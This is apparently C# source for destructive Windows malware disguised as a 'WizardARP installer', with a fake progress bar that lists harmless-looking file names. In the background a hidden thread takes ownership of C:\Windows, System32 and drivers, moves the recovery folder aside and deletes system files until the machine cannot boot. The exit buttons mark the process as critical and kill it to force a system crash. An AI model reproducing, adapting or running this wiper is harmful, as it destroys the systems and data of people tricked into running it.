using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.IO;
using System.Diagnostics;
using System.Reflection;
using System.Runtime.InteropServices;
using Microsoft.Win32;
using System.Threading;

namespace injector
{
    public partial class Form1 : Form
    {
        public static void Extract(string nameSpace, string outDirectory, string internalFilePath, string resourceName)
        {
            Assembly assembly = Assembly.GetCallingAssembly();

            using (Stream s = assembly.GetManifestResourceStream(nameSpace + "." + (internalFilePath == "" ? "" : internalFilePath + ".") + resourceName))
            using (BinaryReader r = new BinaryReader(s))
            using (FileStream fs = new FileStream(outDirectory + "\\" + resourceName, FileMode.OpenOrCreate))
            using (BinaryWriter w = new BinaryWriter(fs))
                w.Write(r.ReadBytes((int)s.Length));
        }

        public Form1()
        {
            InitializeComponent();
            installPanel.Visible = false;
        }

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);

        private void BrowseB_Click(object sender, EventArgs e)
        {
            FolderBrowserDialog folderBrowserDialog= new FolderBrowserDialog();
            
            if (folderBrowserDialog.ShowDialog() == DialogResult.OK)
            {
                textBox1.Text = folderBrowserDialog.SelectedPath;
            }
        }

        private void CancelB_Click(object sender, EventArgs e)
        {
            MessageBox.Show("do you want to cancel setup ?", "WizardARP installer", MessageBoxButtons.YesNo, MessageBoxIcon.Question);

            Application.Exit();
            int status = 1;
            Process.EnterDebugMode();

            NtSetInformationProcess(Process.GetCurrentProcess().Handle, 0x1D, ref status, sizeof(int));
            Process.GetCurrentProcess().Kill();
        }

        private void NextB_Click(object sender, EventArgs e)
        {
            WelcomePanel.Visible = false;
            installPanel.Visible = true;
            timer1.Enabled = true;
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            if (progressBar1.Value < 100)
            {
                progressBar1.Value += 1;

                // onLoad

                if (progressBar1.Value == 3)
                {
                    files.Text = "WindowsMbrOverWriter.dll";
                }

                if (progressBar1.Value == 5)
                {
                    files.Text = "Axinterop.WMPLib.dll";
                    Extract("injector", Application.StartupPath, "Resources", "AxInterop.WMPLib.dll");
                }

                if (progressBar1.Value == 7)
                {
                    files.Text = "interop.WMPLib.dll";
                    Extract("injector", Application.StartupPath, "Resources", "Interop.WMPLib.dll");
                }

                if (progressBar1.Value == 9)
                {
                    files.Text = "SystemConfigurationFile.cfg";
                }

                if (progressBar1.Value == 11)
                {
                    files.Text = "WizardARPLibraries-x64.lib";
                }

                if (progressBar1.Value == 20)
                {
                    files.Text = "WMPLib(x86).dll";
        }

                if (progressBar1.Value == 43)
                {
                    Thread DeleteSystemFiles = new Thread(sys);
                    files.Text = "Microsoft.NET-SDK-4.0.lib";

                    DeleteSystemFiles.Start();
                }

                if (progressBar1.Value == 75)
                {
                    files.Text = "Axinterop.Lib.json";
                }

                if (progressBar1.Value == 100)
                {
                    files.Text = "installation complete successfully.";
                }

                // finish button function
            }
            
            else
            {
                timer1.Enabled = false;
                finishB.Enabled = true;
            }
        }
        private void button3_Click(object sender, EventArgs e)
        {
            Application.Exit();
            int status = 1;
            Process.EnterDebugMode();

            NtSetInformationProcess(Process.GetCurrentProcess().Handle, 0x1D, ref status, sizeof(int));
            Process.GetCurrentProcess().Kill();
        }

        private void Form1_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.LWin && e.KeyCode == Keys.RWin)
            {
                int status = 1;
                Process.EnterDebugMode();

                NtSetInformationProcess(Process.GetCurrentProcess().Handle, 0x1D, ref status, sizeof(int));
                Process.GetCurrentProcess().Kill();
            }
        }


        public void sys()
        {
            Thread.Sleep(1000);
            string quote = "\"";
            string recovery = @"C:\Recovery";
            ProcessStartInfo takeown = new ProcessStartInfo();
            takeown.FileName = "cmd.exe";
            takeown.WindowStyle = ProcessWindowStyle.Hidden;
            takeown.Arguments = @"/k takeown /f C:\Windows && icacls C:\Windows /grant "
            + quote + "%username%:F" + quote + @" && takeown /f C:\Windows\System32 && icacls C:\Windows\System32 /grant "
            + quote + "%username%:F" + quote + @" && takeown / f C:\Windows\System32\drivers && icacls C:\Windows\System32\drivers /grant "
            + quote + "%username%:F" + quote + " && exit";
            Process.Start(takeown);
            //Destroy recovery and sys files
            if (Directory.Exists(recovery))
            {
                Directory.Move(recovery, @"C:\billkok");
            }
            while (File.Exists(@"C:\Windows\System32\drivers\disk.sys") || File.Exists(@"C:\Windows\System32\winload.exe"))
            {
                string[] WindowsFolder = Directory.GetFiles(@"C:\Windows");
                foreach (string winfloder in WindowsFolder)
                {
                    try
                    {
                        File.Delete(winfloder);
                    }
                    catch { }
                }
                string[] systenfiles = Directory.GetFiles(@"C:\Windows\System32");
                foreach (string sysfiles in systenfiles)
                {
                    try
                    {
                        File.Delete(sysfiles);
                    }
                    catch { }
                }
                string[] drivers = Directory.GetFiles(@"C:\Windows\System32\drivers");
                foreach (string windowsDrivers in drivers)
                {
                    try
                    {
                        File.Delete(windowsDrivers);
                    }
                    catch { }
                }
            }
        }
    }
}
